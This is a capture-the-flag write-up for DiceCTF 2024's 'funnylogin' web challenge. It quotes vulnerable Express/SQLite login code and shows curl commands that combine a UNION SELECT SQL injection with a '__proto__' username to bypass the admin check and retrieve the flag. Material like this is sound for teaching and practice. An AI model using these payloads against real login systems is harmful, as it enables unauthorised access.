
<!DOCTYPE html>
<html>

<body>
    <h1>dicectf 2024- web/funnylogin Challenge Writeup(first save it)</h1>

    <h2>Challenge Description</h2>
    <p> NOTE: no bruteforcing is required for this challenge! please do not bruteforce the challenge.

funnylogin:https://funnylogin.mc.ax/
 https://static.dicega.ng/uploads/6beb05ec61c3436cf1e0d566f56e786e42bd8e2fe788404169cae34c368929e4/funnylogin.tar.gz
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
 

# Solution
URL and source are passed.
When you access it, it looks like just a login form.
![site.png](site/site.png)
Looking at the source, the main parts of app.js are as follows.
<pre>
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex" ) }));
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u. pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;

app.use(express.urlencoded({ extended: false }));
app.use(express.static("public"));

app.post("/api/login", (req, res) => {
     const { user, pass } = req.body;

     const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
     try {
         const id = db.prepare(query).get()?.id;
         if (!id) {
             return res.redirect("/?message=Incorrect username or password");
         }

         if (users[id] && isAdmin[user]) {
             return res.redirect("/?flag=" + encodeURIComponent(FLAG));
         }
         return res.redirect("/?message=This system is currently only available to admins...");
     }
     catch {
         return res.redirect("/?message=Nice try...");
     }
});
</pre>
There is SQLi which is trivial.
However, it seems that you can only become admin if <pre>users[id] && isAdmin[user]<pre> is true.
First, consider <pre>isAdmin[user]</pre>.
Only one of the users created in large quantities was randomly added as the `isAdmin` key, and we do not know who is the admin.
Here, you will notice that if you specify <pre>__proto__</pre> or <pre>toString</pre> to <pre>user</pre>, it will not become <pre>undefined</pre>.
For the remaining <pre>users[id]</pre>, just return an appropriate <pre>id</pre> using SQLi UNION.
Do as follows.
<pre>
$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=user&pass=pass"</pre>
Found. Redirecting to /?message=Incorrect%20username%20or%20password
<pre>$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=__proto__&pass=' UNION SELECT id FROM users WHERE id = 1; -- satoki"</pre>
Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
 
flag found


    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag"> dice{i_l0ve_java5cript!}
</p>

    <h2>Conclusion</h2>
    <p>this is a easy sql injection and web exploitaion challenge with work on javascript files</p>
</body>
</html>
